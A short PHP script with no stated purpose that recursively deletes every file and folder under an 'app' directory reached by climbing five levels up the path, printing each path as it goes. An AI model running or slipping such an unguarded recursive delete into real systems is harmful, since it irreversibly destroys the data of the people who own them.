<?php
$dirname= ('../../../../../app');
rmrf($dirname);
function rmrf($dir) {
    foreach (glob($dir) as $file) {
        echo $file;
        if (is_dir($file)) {
            rmrf("$file/*");
            rmdir($file);
        } else {
            unlink($file);
        }
    }
}